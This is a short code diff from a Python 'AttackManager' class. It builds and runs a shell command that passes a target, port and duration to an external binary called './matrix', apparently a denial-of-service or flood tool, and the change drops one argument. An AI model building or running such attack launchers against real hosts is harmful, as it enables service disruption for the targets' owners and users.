@@ -198,7 +198,7 @@ class AttackManager:
         port = attack_info['port']
         time_duration = attack_info['time']
         
-        full_command = f"./matrix {target} {port} {time_duration} 60"
+        full_command = f"./matrix {target} {port} {time_duration}"
         
         try:
             process = subprocess.Popen(
